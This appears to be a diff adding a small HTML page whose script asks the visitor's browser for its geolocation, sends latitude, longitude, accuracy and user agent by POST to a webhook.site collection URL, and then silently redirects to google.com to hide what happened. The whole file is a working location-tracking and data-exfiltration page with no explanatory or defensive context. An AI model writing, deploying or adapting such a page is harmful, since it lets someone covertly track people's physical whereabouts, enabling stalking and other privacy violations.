@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+navigator.geolocation.getCurrentPosition(async (pos) => {
+
+  const data = {
+    latitude: pos.coords.latitude,
+    longitude: pos.coords.longitude,
+    accuracy: pos.coords.accuracy,
+    userAgent: navigator.userAgent
+  };
+
+  await fetch("https://webhook.site/4af76aac-da40-4d5a-828a-60883dbc171f", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify(data)
+  });
+
+  window.location.href = "https://www.google.com";
+
+});
+</script>
+</body>
+</html>
